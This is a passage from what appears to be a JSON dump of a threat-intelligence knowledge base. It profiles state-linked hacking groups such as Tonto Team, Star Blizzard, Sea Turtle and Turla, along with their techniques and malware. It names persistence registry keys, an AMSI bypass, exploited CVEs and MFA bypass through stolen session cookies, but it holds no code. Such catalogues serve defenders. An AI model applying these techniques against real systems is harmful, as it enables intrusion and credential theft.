Defenses: Disable or Modify System Firewall, Indicator Removal: File Deletion, Indicator Removal: Clear Persistence, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Non-Standard Port, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Compile After Delivery, Peripheral Device Discovery, Process Discovery, Query Registry, Remote Services: Remote Desktop Protocol, Remote System Discovery, Replication Through Removable Media, Screen Capture, System Information Discovery, System Owner/User Discovery, Video Capture S0644 ObliqueRAT [8][7] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Data from Removable Media, Data Staged: Local Data Staging, Data Transfer Size Limits, File and Directory Discovery, Obfuscated Files or Information: Steganography, Peripheral Device Discovery, Process Discovery, Screen Capture, System Information Discovery, System Owner/User Discovery, User Execution: Malicious Link, Video Capture, Virtualization/Sandbox Evasion: System Checks S0643 Peppy [6] Application Layer Protocol: Web Protocols, Automated Exfiltration, Command and Scripting Interpreter: Windows Command Shell, File and Directory Discovery, Ingress Tool Transfer, Input Capture: Keylogging, Screen Capture References Huss, D. (2016, March 1). Operation Transparent Tribe. Retrieved June 8, 2016. Dedola, G. (2020, August 20). Transparent Tribe: Evolution analysis, part 1. Retrieved September 2, 2021. Malhotra, A. et al. (2021, May 13). Transparent Tribe APT expands its Windows malware arsenal. Retrieved September 2, 2021. Secureworks. (n.d.). COPPER FIELDSTONE. Retrieved October 6, 2021. Crowdstrike. (n.d.). Mythic Leopard. Retrieved October 6, 2021. Falcone, R. and Conant S. (2016, March 25). ProjectM: Link Found Between Pakistani Actor and Operation Transparent Tribe. Retrieved September 2, 2021. N. Baisini. (2022, July 13). Transparent Tribe begins targeting education sector in latest campaign. Retrieved September 22, 2022. Malhotra, A. (2021, March 2). ObliqueRAT returns with new campaign using hijacked websites. Retrieved September 2, 2021. "
},
{
"id": 217,
"title": "Tonto Team, Earth Akhlut, BRONZE HUNTLEY, CactusPete, Karma Panda, Group G0131",
"path": "/groups/G0131/index.html",
"content": " Tonto Team Tonto Team is a suspected Chinese state-sponsored cyber espionage threat group that has primarily targeted South Korea, Japan, Taiwan, and the United States since at least 2009; by 2020 they expanded operations to include other Asian as well as Eastern European countries. Tonto Team has targeted government, military, energy, mining, financial, education, healthcare, and technology organizations, including through the Heartbeat Campaign (2009-2012) and Operation Bitter Biscuit (2017).[1][2][3][4][5][6] ID: G0131 \u24d8 Associated Groups: Earth Akhlut, BRONZE HUNTLEY, CactusPete, Karma Panda Version: 1.1 Created: 05 May 2021 Last Modified: 17 November 2024 Version Permalink Live Version Associated Group Descriptions Name Description Earth Akhlut [7] BRONZE HUNTLEY [8] CactusPete [1] Karma Panda [1][9] Techniques Used Domain ID Name Use Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Tonto Team has used PowerShell to download additional payloads.[2] .006 Command and Scripting Interpreter: Python Tonto Team has used Python-based tools for execution.[7] Enterprise T1203 Exploitation for Client Execution Tonto Team has exploited Microsoft vulnerabilities, including CVE-2018-0798, CVE-2018-8174, CVE-2018-0802, CVE-2017-11882, CVE-2019-9489 CVE-2020-8468, and CVE-2018-0798 to enable execution of their delivered malicious payloads.[1][7][10][6] Enterprise T1068 Exploitation for Privilege Escalation Tonto Team has exploited CVE-2019-0803 and MS16-032 to escalate privileges.[7] Enterprise T1210 Exploitation of Remote Services Tonto Team has used EternalBlue exploits for lateral movement.[7] Enterprise T1574 .001 Hijack Execution Flow: DLL Tonto Team abuses a legitimate and signed Microsoft executable to launch a malicious DLL.[2] Enterprise T1105 Ingress Tool Transfer Tonto Team has downloaded malicious DLLs which served as a ShadowPad loader.[2] Enterprise T1056 .001 Input Capture: Keylogging Tonto Team has used keylogging tools in their operations.[7] Enterprise T1135 Network Share Discovery Tonto Team has used tools such as NBTscan to enumerate network shares.[7] Enterprise T1003 OS Credential Dumping Tonto Team has used a variety of credential dumping tools.[7] Enterprise T1069 .001 Permission Groups Discovery: Local Groups Tonto Team has used the ShowLocalGroupDetails command to identify administrator, user, and guest accounts on a compromised host.[7] Enterprise T1566 .001 Phishing: Spearphishing Attachment Tonto Team has delivered payloads via spearphishing attachments.[7] Enterprise T1090 .002 Proxy: External Proxy Tonto Team has routed their traffic through an external server in order to obfuscate their location.[7] Enterprise T1505 .003 Server Software Component: Web Shell Tonto Team has used a first stage web shell after compromising a vulnerable Exchange server.[2] Enterprise T1204 .002 User Execution: Malicious File Tonto Team has relied on user interaction to open their malicious RTF documents.[7][10] Software ID Name References Techniques S0268 Bisonal [1][8][10] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Deobfuscate/Decode Files or Information, Dynamic Resolution, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Masquerading, Modify Registry, Native API, Non-Application Layer Protocol, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Binary Padding, Obfuscated Files or Information: Software Packing, Office Application Startup: Add-ins, Phishing: Spearphishing Attachment, Process Discovery, Proxy, Query Registry, System Binary Proxy Execution: Rundll32, System Information Discovery, System Network Configuration Discovery, System Time Discovery, User Execution: Malicious File, Virtualization/Sandbox Evasion, Virtualization/Sandbox Evasion: Time Based Evasion S0008 gsecdump [7] OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSA Secrets S0349 LaZagne [7] Credentials from Password Stores: Windows Credential Manager, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores, Credentials from Password Stores: Keychain, OS Credential Dumping: LSA Secrets, OS Credential Dumping: /etc/passwd and /etc/shadow, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Cached Domain Credentials, OS Credential Dumping: Proc Filesystem, Unsecured Credentials: Credentials In Files S0002 Mimikatz [1] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0590 NBTscan [7] Network Service Discovery, Network Sniffing, Remote System Discovery, System Network Configuration Discovery, System Owner/User Discovery S0596 ShadowPad [1] Application Layer Protocol: DNS, Application Layer Protocol: File Transfer Protocols, Application Layer Protocol: Web Protocols, Data Encoding: Non-Standard Encoding, Deobfuscate/Decode Files or Information, Dynamic Resolution: Domain Generation Algorithms, Indicator Removal, Ingress Tool Transfer, Modify Registry, Non-Application Layer Protocol, Obfuscated Files or Information: Fileless Storage, Obfuscated Files or Information, Process Discovery, Process Injection, Process Injection: Dynamic-link Library Injection, Scheduled Transfer, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Time Discovery References Zykov, K. (2020, August 13). CactusPete APT group\u2019s updated Bisonal backdoor. Retrieved May 5, 2021. Faou, M., Tartare, M., Dupuy, T. (2021, March 10). Exchange servers under siege from at least 10 APT groups. Retrieved May 21, 2021. Nalani Fraser, Kelli Vanderlee. (2019, October 10). Achievement Unlocked - Chinese Cyber Espionage Evolves to Support Higher Level Missions. Retrieved November 17, 2024. Sean Gallagher. (2017, April 21). Researchers claim China trying to hack South Korea missile defense efforts. Retrieved October 17, 2021. Roland Dela Paz. (2003, January 3). The HeartBeat APT Campaign. Retrieved October 17, 2021. Warren Mercer, Paul Rascagneres, Vitor Ventura. (2020, March 6). Bisonal 10 Years of Play. Retrieved October 17, 2021. Daniel Lughi, Jaromir Horejsi. (2020, October 2). Tonto Team - Exploring the TTPs of an advanced threat actor operating a large infrastructure. Retrieved October 17, 2021. Secureworks. (2021, January 1). BRONZE HUNTLEY Threat Profile. Retrieved May 5, 2021. Falcon OverWatch Team. (2020, July 14). Manufacturing Industry in the Adversaries\u2019 Crosshairs. Retrieved October 17, 2021. Mercer, W., et al. (2020, March 5). Bisonal: 10 years of play. Retrieved January 26, 2022. "
},
{
"id": 218,
"title": "Group5, Group G0043",
"path": "/groups/G0043/index.html",
"content": " Group5 Group5 is a threat group with a suspected Iranian nexus, though this attribution is not definite. The group has targeted individuals connected to the Syrian opposition via spearphishing and watering holes, normally using Syrian and Iranian themes. Group5 has used two commonly available remote access tools (RATs), njRAT and NanoCore, as well as an Android RAT, DroidJack. [1] ID: G0043 Version: 1.3 Created: 31 May 2017 Last Modified: 11 April 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1070 .004 Indicator Removal: File Deletion Malware used by Group5 is capable of remotely deleting files from victims.[1] Enterprise T1056 .001 Input Capture: Keylogging Malware used by Group5 is capable of capturing keystrokes.[1] Enterprise T1027 .013 Obfuscated Files or Information: Encrypted/Encoded File Group5 disguised its malicious binaries with several layers of obfuscation, including encrypting the files.[1] Enterprise T1113 Screen Capture Malware used by Group5 is capable of watching the victim's screen.[1] Software ID Name References Techniques S0336 NanoCore [1] Audio Capture, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: Visual Basic, Encrypted Channel: Symmetric Cryptography, Impair Defenses: Disable or Modify System Firewall, Impair Defenses: Disable or Modify Tools, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Obfuscated Files or Information, System Network Configuration Discovery, Video Capture S0385 njRAT [1] Application Layer Protocol: Web Protocols, Application Window Discovery, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Credentials from Password Stores: Credentials from Web Browsers, Data Encoding: Standard Encoding, Data from Local System, Dynamic Resolution: Fast Flux DNS, Exfiltration Over C2 Channel, File and Directory Discovery, Impair Defenses: Disable or Modify System Firewall, Indicator Removal: File Deletion, Indicator Removal: Clear Persistence, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Non-Standard Port, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Compile After Delivery, Peripheral Device Discovery, Process Discovery, Query Registry, Remote Services: Remote Desktop Protocol, Remote System Discovery, Replication Through Removable Media, Screen Capture, System Information Discovery, System Owner/User Discovery, Video Capture References Scott-Railton, J., et al. (2016, August 2). Group5: Syria and the Iranian Connection. Retrieved September 26, 2016. "
},
{
"id": 219,
"title": "Silent Librarian, TA407, COBALT DICKENS, Group G0122",
"path": "/groups/G0122/index.html",
"content": " Silent Librarian Silent Librarian is a group that has targeted research and proprietary data at universities, government agencies, and private sector companies worldwide since at least 2013. Members of Silent Librarian are known to have been affiliated with the Iran-based Mabna Institute which has conducted cyber intrusions at the behest of the government of Iran, specifically the Islamic Revolutionary Guard Corps (IRGC).[1][2][3] ID: G0122 \u24d8 Associated Groups: TA407, COBALT DICKENS Version: 1.0 Created: 03 February 2021 Last Modified: 16 April 2025 Version Permalink Live Version Associated Group Descriptions Name Description TA407 [4][3] COBALT DICKENS [5][6][4][3] Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains Silent Librarian has acquired domains to establish credential harvesting pages, often spoofing the target organization and using free top level domains .TK, .ML, .GA, .CF, and .GQ.[1][2][5][4][6][3] Enterprise T1110 .003 Brute Force: Password Spraying Silent Librarian has used collected lists of names and e-mail accounts to use in password spraying attacks against private sector targets.[1] Enterprise T1114 Email Collection Silent Librarian has exfiltrated entire mailboxes from compromised accounts.[1] .003 Email Forwarding Rule Silent Librarian has set up auto forwarding rules on compromised e-mail accounts.[1] Enterprise T1585 .002 Establish Accounts: Email Accounts Silent Librarian has established e-mail accounts to receive e-mails forwarded from compromised accounts.[1] Enterprise T1589 .002 Gather Victim Identity Information: Email Addresses Silent Librarian has collected e-mail addresses from targeted organizations from open Internet searches.[1] .003 Gather Victim Identity Information: Employee Names Silent Librarian has collected lists of names for individuals from targeted organizations.[1] Enterprise T1588 .002 Obtain Capabilities: Tool Silent Librarian has obtained free and publicly available tools including SingleFile and HTTrack to copy login pages of targeted organizations.[4][6] .004 Obtain Capabilities: Digital Certificates Silent Librarian has obtained free Let's Encrypt SSL certificates for use on their phishing pages.[2][6] Enterprise T1598 .003 Phishing for Information: Spearphishing Link Silent Librarian has used links in e-mails to direct victims to credential harvesting websites designed to appear like the targeted organization's login page.[1][2][5][4][6][3] Enterprise T1594 Search Victim-Owned Websites Silent Librarian has searched victim's websites to identify the interests and academic areas of targeted individuals and to scrape source code, branding, and organizational contact information for phishing pages.[1][2][4] Enterprise T1608 .005 Stage Capabilities: Link Target Silent Librarian has cloned victim organization login pages and staged them for later use in credential harvesting campaigns. Silent Librarian has also made use of a variety of URL shorteners for these staged websites.[6][3][4] Enterprise T1078 Valid Accounts Silent Librarian has used compromised credentials to obtain unauthorized access to online accounts.[1] References DOJ. (2018, March 23). U.S. v. Rafatnejad et al . Retrieved February 3, 2021. Hassold, Crane. (2018, March 26). Silent Librarian: More to the Story of the Iranian Mabna Institute Indictment. Retrieved February 3, 2021. Malwarebytes Threat Intelligence Team. (2020, October 14). Silent Librarian APT right on schedule for 20/21 academic year. Retrieved February 3, 2021. Proofpoint Threat Insight Team. (2019, September 5). Threat Actor Profile: TA407, the Silent Librarian. Retrieved February 3, 2021. Counter Threat Unit Research Team. (2018, August 24). Back to School: COBALT DICKENS Targets Universities. Retrieved February 3, 2021. Counter Threat Unit Research Team. (2019, September 11). COBALT DICKENS Goes Back to School\u2026Again. Retrieved February 3, 2021. "
},
{
"id": 220,
"title": "Star Blizzard, SEABORGIUM, Callisto Group, TA446, COLDRIVER, Group G1033",
"path": "/groups/G1033/index.html",
"content": " Star Blizzard Star Blizzard is a cyber espionage and influence group originating in Russia that has been active since at least 2019. Star Blizzard campaigns align closely with Russian state interests and have included persistent phishing and credential theft against academic, defense, government, NGO, and think tank organizations in NATO countries, particularly the US and the UK.[1][2][3][4] ID: G1033 \u24d8 Associated Groups: SEABORGIUM, Callisto Group, TA446, COLDRIVER Contributors: Aung Kyaw Min Naing, @Nolan Version: 1.0 Created: 14 June 2024 Last Modified: 14 June 2024 Version Permalink Live Version Associated Group Descriptions Name Description SEABORGIUM [1] Callisto Group [2] TA446 [2] COLDRIVER [4] Techniques Used Domain ID Name Use Enterprise T1583 Acquire Infrastructure Star Blizzard has used HubSpot and MailerLite marketing platform services to hide the true sender of phishing emails.[3] .001 Domains Star Blizzard has registered domains using randomized words and with names resembling legitimate organizations.[2][3] Enterprise T1059 .007 Command and Scripting Interpreter: JavaScript Star Blizzard has used JavaScript to redirect victim traffic from an adversary controlled server to a server hosting the Evilginx phishing framework.[3] Enterprise T1586 .002 Compromise Accounts: Email Accounts Star Blizzard has used compromised email accounts to conduct spearphishing against contacts of the original victim.[2] Enterprise T1114 .002 Email Collection: Remote Email Collection Star Blizzard has remotely accessed victims' email accounts to steal messages and attachments.[2] .003 Email Collection: Email Forwarding Rule Star Blizzard has abused email forwarding rules to monitor the activities of a victim, steal information, and maintain persistent access after compromised credentials are reset.[1][2] Enterprise T1585 .001 Establish Accounts: Social Media Accounts Star Blizzard has established fraudulent profiles on professional networking sites to conduct reconnaissance.[1][2] .002 Establish Accounts: Email Accounts Star Blizzard has registered impersonation email accounts to spoof experts in a particular field or individuals and organizations affiliated with the intended target.[1][2][4] Enterprise T1589 Gather Victim Identity Information Star Blizzard has identified ways to engage targets by researching potential victims' interests and social or professional contacts.[2] Enterprise T1588 .002 Obtain Capabilities: Tool Star Blizzard has incorporated the open-source EvilGinx framework into their spearphishing activity.[2][3] Enterprise T1566 .001 Phishing: Spearphishing Attachment Star Blizzard has sent emails with malicious .pdf files to spread malware.[4] Enterprise T1598 .002 Phishing for Information: Spearphishing Attachment Star Blizzard has sent emails to establish rapport with targets eventually sending messages with attachments containing links to credential-stealing sites.[1][2][3][4] .003 Phishing for Information: Spearphishing Link Star Blizzard has sent emails to establish rapport with targets eventually sending messages with links to credential-stealing sites.[1][2][3][4] Enterprise T1593 Search Open Websites/Domains Star Blizzard has used open-source research to identify information about victims to use in targeting.[1][2] Enterprise T1608 .001 Stage Capabilities: Upload Malware Star Blizzard has uploaded malicious payloads to cloud storage sites.[4] Enterprise T1539 Steal Web Session Cookie Star Blizzard has used EvilGinx to steal the session cookies of victims directed to phishing domains.[2] Enterprise T1550 .004 Use Alternate Authentication Material: Web Session Cookie Star Blizzard has bypassed multi-factor authentication on victim email accounts by using session cookies stolen using EvilGinx.[2] Enterprise T1204 .002 User Execution: Malicious File Star Blizzard has lured targets into opening malicious .pdf files to deliver malware.[4] Enterprise T1078 Valid Accounts Star Blizzard has used stolen credentials to sign into victim email accounts.[1][2] Software ID Name References Techniques S1140 Spica [4] Archive Collected Data, Command and Scripting Interpreter: PowerShell, Deobfuscate/Decode Files or Information, File and Directory Discovery, Ingress Tool Transfer, Masquerading: Masquerade Task or Service, Non-Application Layer Protocol, Scheduled Task/Job: Scheduled Task, Steal Web Session Cookie References Microsoft Threat Intelligence. (2022, August 15). Disrupting SEABORGIUM\u2019s ongoing phishing operations. Retrieved June 13, 2024. CISA, et al. (2023, December 7). Russian FSB Cyber Actor Star Blizzard Continues Worldwide Spear-phishing Campaigns. Retrieved June 13, 2024. Microsoft Threat Intelligence. (2023, December 7). Star Blizzard increases sophistication and evasion in ongoing attacks. Retrieved February 13, 2024. Shields, W. (2024, January 18). Russian threat group COLDRIVER expands its targeting of Western officials to include the use of malware. Retrieved June 13, 2024. "
},
{
"id": 221,
"title": "Sea Turtle, Teal Kurma, Marbled Dust, Cosmic Wolf, SILICON, Group G1041",
"path": "/groups/G1041/index.html",
"content": " Sea Turtle Sea Turtle is a T\u00fcrkiye-linked threat actor active since at least 2017 performing espionage and service provider compromise operations against victims in Asia, Europe, and North America. Sea Turtle is notable for targeting registrars managing ccTLDs and complex DNS-based intrusions where the threat actor compromised DNS providers to hijack DNS resolution for ultimate victims, enabling Sea Turtle to spoof log in portals and other applications for credential collection.[1][2][3][4] ID: G1041 \u24d8 Associated Groups: Teal Kurma, Marbled Dust, Cosmic Wolf, SILICON Contributors: Inna Danilevich, U.S. Bank; Joe Gumke, U.S. Bank Version: 1.0 Created: 20 November 2024 Last Modified: 28 March 2025 Version Permalink Live Version Associated Group Descriptions Name Description Teal Kurma [3][4] Marbled Dust [3][4] Cosmic Wolf [3][4] SILICON [5][4] Techniques Used Domain ID Name Use Enterprise T1583 Acquire Infrastructure Sea Turtle accessed victim networks from VPN service provider networks.[4] .001 Domains Sea Turtle registered domains for authoritative name servers used in DNS hijacking activity and for command and control servers.[2][4] .002 DNS Server Sea Turtle built adversary-in-the-middle DNS servers to impersonate legitimate services that were later used to capture credentials.[2][1] .003 Virtual Private Server Sea Turtle created adversary-in-the-middle servers to impersonate legitimate services and enable credential capture.[1] Enterprise T1557 Adversary-in-the-Middle Sea Turtle modified DNS records at service providers to redirect traffic from legitimate resources to Sea Turtle-controlled servers to enable adversary-in-the-middle attacks for credential capture.[1][2] Enterprise T1071 .001 Application Layer Protocol: Web Protocols Sea Turtle connected over TCP using HTTP to establish command and control channels.[4] Enterprise T1560 .001 Archive Collected Data: Archive via Utility Sea Turtle used the tar utility to create a local archive of email data on a victim system.[4] Enterprise T1059 .004 Command and Scripting Interpreter: Unix Shell Sea Turtle used shell scripts for post-exploitation execution in victim environments.[3][4] Enterprise T1584 .002 Compromise Infrastructure: DNS Server Sea Turtle modified Name Server (NS) items to refer to Sea Turtle-controlled DNS servers to provide responses for all DNS lookups.[1][2] Enterprise T1213 Data from Information Repositories Sea Turtle used the tool Adminer to remotely logon to the MySQL service of victim machines.[4] Enterprise T1074 .002 Data Staged: Remote Data Staging Sea Turtle staged collected email archives in the public web directory of a website that was accessible from the internet.[4] Enterprise T1114 .001 Email Collection: Local Email Collection Sea Turtle collected email archives from victim environments.[4] Enterprise T1190 Exploit Public-Facing Application Sea Turtle gained access to victim environments by exploiting multiple known vulnerabilities over several campaigns.[1][3] Enterprise T1203 Exploitation for Client Execution Sea Turtle has used exploits for vulnerabilities such as CVE-2021-44228, CVE-2021-21974, and CVE-2022-0847 to achieve client code execution.[3] Enterprise T1133 External Remote Services Sea Turtle has used external-facing SSH to achieve initial access to the IT environments of victim organizations.[4] Enterprise T1564 .011 Hide Artifacts: Ignore Process Interrupts Sea Turtle executed SnappyTCP using the tool NoHup, which keeps the malware running on a system after exiting the shell or terminal.[4] Enterprise T1562 .003 Impair Defenses: Impair Command History Logging Sea Turtle unset the Bash and MySQL history files on victim systems.[4] Enterprise T1070 .002 Indicator Removal: Clear Linux or Mac System Logs Sea Turtle has overwritten Linux system logs and unsets the Bash history file (effectively removing logging) during intrusions.[4] Enterprise T1027 .004 Obfuscated Files or Information: Compile After Delivery Sea Turtle downloaded source code files from remote addresses then compiled them locally via GCC in victim environments.[4] Enterprise T1588 .002 Obtain Capabilities: Tool Sea Turtle has used tools such as Adminer during intrusions.[4] .004 Obtain Capabilities: Digital Certificates Sea Turtle created new certificates using a technique called the actors performed \"certificate impersonation,\" a technique in which Sea Turtle obtained a certificate authority-signed X.509 certificate from another provider for the same domain imitating the one already used by the targeted organization.[1][2] Enterprise T1566 Phishing Sea Turtle used spear phishing to gain initial access to victims.[1] Enterprise T1505 .003 Server Software Component: Web Shell Sea Turtle deployed the SnappyTCP web shell during intrusion operations.[3][4] Enterprise T1608 .003 Stage Capabilities: Install Digital Certificate Sea Turtle captured legitimate SSL certificates from victim organizations and installed these on Sea Turtle-controlled infrastructure to enable subsequent adversary-in-the-middle operations.[1] Enterprise T1199 Trusted Relationship Sea Turtle targeted third-party entities in trusted relationships with primary targets to ultimately achieve access at primary targets. Entities targeted included DNS registrars, telecommunication companies, and internet service providers.[1] Enterprise T1078 Valid Accounts Sea Turtle used compromised credentials to maintain long-term access to victim environments.[1] .003 Local Accounts Sea Turtle compromised cPanel accounts in victim environments.[4] Software ID Name References Techniques S1163 SnappyTCP Sea Turtle used SnappyTCP following initial access in intrusions from 2021 to 2023.[3] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Unix Shell, Encrypted Channel: Asymmetric Cryptography, Non-Application Layer Protocol, Server Software Component: Web Shell References Cisco Talos. (2019, April 17). Sea Turtle: DNS Hijacking Abuses Trust In Core Internet Service. Retrieved November 20, 2024. Paul Rascagneres. (2019, July 9). Sea Turtle keeps on swimming, finds new victims, DNS hijacking techniques. Retrieved November 20, 2024. PwC Threat Intelligence. (2023, December 5). The Tortoise and The Malware. Retrieved November 20, 2024. Hunt & Hackett Research Team. (2024, January 5). Turkish espionage campaigns in the Netherlands. Retrieved November 20, 2024. Microsoft. (2021, October). Microsoft Digital Defense Report. Retrieved November 20, 2024. "
},
{
"id": 222,
"title": "APT16, Group G0023",
"path": "/groups/G0023/index.html",
"content": " APT16 APT16 is a China-based threat group that has launched spearphishing campaigns targeting Japanese and Taiwanese organizations. [1] ID: G0023 Version: 1.1 Created: 31 May 2017 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1584 .004 Compromise Infrastructure: Server APT16 has compromised otherwise legitimate sites as staging servers for second-stage payloads.[1] Software ID Name References Techniques S0064 ELMER [1] Application Layer Protocol: Web Protocols, File and Directory Discovery, Process Discovery References Winters, R. (2015, December 20). The EPS Awakens - Part 2. Retrieved January 22, 2016. "
},
{
"id": 223,
"title": "Turla, IRON HUNTER, Group 88, Waterbug, WhiteBear, Snake, Krypton, Venomous Bear, Secret Blizzard, BELUGASTURGEON, Group G0010",
"path": "/groups/G0010/index.html",
"content": " Turla Turla is a cyber espionage threat group that has been attributed to Russia's Federal Security Service (FSB). They have compromised victims in over 50 countries since at least 2004, spanning a range of industries including government, embassies, military, education, research and pharmaceutical companies. Turla is known for conducting watering hole and spearphishing campaigns, and leveraging in-house tools and malware, such as Uroburos.[1][2][3][4][5] ID: G0010 \u24d8 Associated Groups: IRON HUNTER, Group 88, Waterbug, WhiteBear, Snake, Krypton, Venomous Bear, Secret Blizzard, BELUGASTURGEON Contributors: Matthieu Faou, ESET; Edward Millington Version: 5.1 Created: 31 May 2017 Last Modified: 26 June 2024 Version Permalink Live Version Associated Group Descriptions Name Description IRON HUNTER [6] Group 88 [7] Waterbug Based similarity in TTPs and malware used, Turla and Waterbug appear to be the same group.[8] WhiteBear WhiteBear is a designation used by Securelist to describe a cluster of activity that has overlaps with activity described by others as Turla, but appears to have a separate focus.[9][10] Snake [3][11][10] Krypton [3] Venomous Bear [3][10] Secret Blizzard [12] BELUGASTURGEON [13] Techniques Used Domain ID Name Use Enterprise T1134 .002 Access Token Manipulation: Create Process with Token Turla RPC backdoors can impersonate or steal process tokens before executing commands.[11] Enterprise T1087 .001 Account Discovery: Local Account Turla has used net user to enumerate local accounts on the system.[14][15] .002 Account Discovery: Domain Account Turla has used net user /domain to enumerate domain accounts.[14] Enterprise T1583 .006 Acquire Infrastructure: Web Services Turla has created web accounts including Dropbox and GitHub for C2 and document exfiltration.[15] Enterprise T1071 .001 Application Layer Protocol: Web Protocols Turla has used HTTP and HTTPS for C2 communications.[4][16] .003 Application Layer Protocol: Mail Protocols Turla has used multiple backdoors which communicate with a C2 server via email attachments.[17] Enterprise T1560 .001 Archive Collected Data: Archive via Utility Turla has encrypted files stolen from connected USB drives into a RAR file before exfiltration.[18] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder A Turla Javascript backdoor added a local_update_check value under the Registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run to establish persistence. Additionally, a Turla custom executable containing Metasploit shellcode is saved to the Startup folder to gain persistence.[4][16][19] .004 Boot or Logon Autostart Execution: Winlogon Helper DLL Turla established persistence by adding a Shell value under the Registry key HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon.[4] Enterprise T1110 Brute Force Turla may attempt to connect to systems within a victim's network using net use commands and a predefined list or collection of passwords.[1] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Turla has used PowerShell to execute commands/scripts, in some cases via a custom executable or code from Empire's PSInject.[16][11][18] Turla has also used PowerShell scripts to load and execute malware in memory. .003 Command and Scripting Interpreter: Windows Command Shell Turla RPC backdoors have used cmd.exe to execute commands.[11][18] .005 Command and Scripting Interpreter: Visual Basic Turla has used VBS scripts throughout its operations.[18] .006 Command and Scripting Interpreter: Python Turla has used IronPython scripts as part of the IronNetInjector toolchain to drop payloads.[20] .007 Command and Scripting Interpreter: JavaScript Turla has used various JavaScript-based backdoors.[4] Enterprise T1584 .003 Compromise Infrastructure: Virtual Private Server Turla has used the VPS infrastructure of compromised Iranian threat actors.[21] .004 Compromise Infrastructure: Server Turla has used compromised servers as infrastructure.[22][13][10] .006 Compromise Infrastructure: Web Services Turla has frequently used compromised WordPress sites for C2 infrastructure.[22] Enterprise T1555 .004 Credentials from Password Stores: Windows Credential Manager Turla has gathered credentials from the Windows Credential Manager tool.[18] Enterprise T1213 Data from Information Repositories Turla has used a custom .NET tool to collect documents from an organization's internal central database.[14] Enterprise T1005 Data from Local System Turla RPC backdoors can upload files from victim machines.[11] Enterprise T1025 Data from Removable Media Turla RPC backdoors can collect files from USB thumb drives.[11][18] Enterprise T1140 Deobfuscate/Decode Files or Information Turla has used a custom decryption routine, which pulls key and salt values from other artifacts such as a WMI filter or PowerShell Profile, to decode encrypted PowerShell payloads.[11] Enterprise T1587 .001 Develop Capabilities: Malware Turla has developed its own unique malware for use in operations.[22] Enterprise T1189 Drive-by Compromise Turla has infected victims using watering holes.[14][6] Enterprise T1546 .003 Event Triggered Execution: Windows Management Instrumentation Event Subscription Turla has used WMI event filters and consumers to establish persistence.[11] .013 Event Triggered Execution: PowerShell Profile Turla has used PowerShell profiles to maintain persistence on an infected machine.[11] Enterprise T1567 .002 Exfiltration Over Web Service: Exfiltration to Cloud Storage Turla has used WebDAV to upload stolen USB files to a cloud drive.[18] Turla has also exfiltrated stolen files to OneDrive and 4shared.[14] Enterprise T1068 Exploitation for Privilege Escalation Turla has exploited vulnerabilities in the VBoxDrv.sys driver to obtain kernel mode privileges.[23] Enterprise T1083 File and Directory Discovery Turla surveys a system upon check-in to discover files in specific locations on the hard disk %TEMP% directory, the current user's desktop, the Program Files directory, and Recent.[1][14] Turla RPC backdoors have also searched for files matching the lPH*.dll pattern.[11] Enterprise T1615 Group Policy Discovery Turla surveys a system upon check-in to discover Group Policy details using the gpresult command.[14] Enterprise T1564 .012 Hide Artifacts: File/Path Exclusions Turla has placed LunarWeb install files into directories that are excluded from scanning.[19] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools Turla has used a AMSI bypass, which patches the in-memory amsi.dll, in PowerShell scripts to bypass Windows antimalware products.[11] Enterprise T1105 Ingress Tool Transfer Turla has used shellcode to download Meterpreter after compromising a victim.[16] Enterprise T1570 Lateral Tool Transfer Turla RPC backdoors can be used to transfer files to/from victim machines on the local network.[11][18] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location Turla has named components of LunarWeb to mimic Zabbix agent logs.[19] Enterprise T1112 Modify Registry Turla has modified Registry values to store payloads.[11][18] Enterprise T1106 Native API Turla and its RPC backdoors have used APIs calls for various tasks related to subverting AMSI and accessing then executing commands through RPC and/or named pipes.[11] Enterprise T1027 .005 Obfuscated Files or Information: Indicator Removal from Tools Based on comparison of Gazer versions, Turla made an effort to obfuscate strings in the malware that could be used as IoCs, including the mutex name and named pipe.[2] .010 